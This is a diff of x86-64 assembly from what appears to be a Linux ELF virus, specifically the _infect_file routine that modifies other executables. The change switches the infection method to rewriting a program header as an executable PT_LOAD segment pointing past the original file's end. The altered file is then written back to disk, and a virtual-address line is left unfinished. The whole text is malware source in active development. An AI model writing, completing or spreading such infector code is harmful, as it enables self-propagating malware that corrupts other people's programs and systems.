@@ -771,7 +771,7 @@ _infect_file: ; (string rdi, stat rsi)
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax
-			jge .unmap;.get_segment_note
+			jge .unmap
 			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
 			jne .next
 			mov dx, [rbx + P_FLAGS]; p_flags
@@ -805,30 +805,41 @@ _infect_file: ; (string rdi, stat rsi)
 			pop r10 ; MAP_PRIVATE
 			xor r9, r9
 			mov r8, r11; fd
+			push r11
 			push SYSCALL_MMAP
 			pop rax ; mmap
 			syscall
+			pop r11
 			pop r10
 			pop r8
 
+			sub rbx, r13
 			push r13
 			push rax
 			pop r13
+			add rbx, r13
+			mov dword[rbx], PT_LOAD; PT_LOAD
+			mov dword[rbx + P_FLAGS], 5; PF_X | PF_R
+			mov rax, [r12 + ST_SIZE]
+			mov [rbx + P_OFFSET], rax
+;			mov [rbx + P_VADDR], 
 
-			push r11
-			push 1
-			pop r11; mode PT_NOTE
-			call _infect
-			pop r11
+;			push r11
+;			push 1
+;			pop r11; mode PT_NOTE
+;			call _infect
+;	 		pop r11
 
 			; write file
 			mov rdi, r11
+			push r11
 			mov rsi, r13
 			mov rdx, [r12 + ST_SIZE] ; statbuf.st_size
 			add rdx, r14
 			push SYSCALL_WRITE
 			pop rax
 			syscall
+			pop r11
 
 			; unmap
 			push r11; munmap using r11 ?
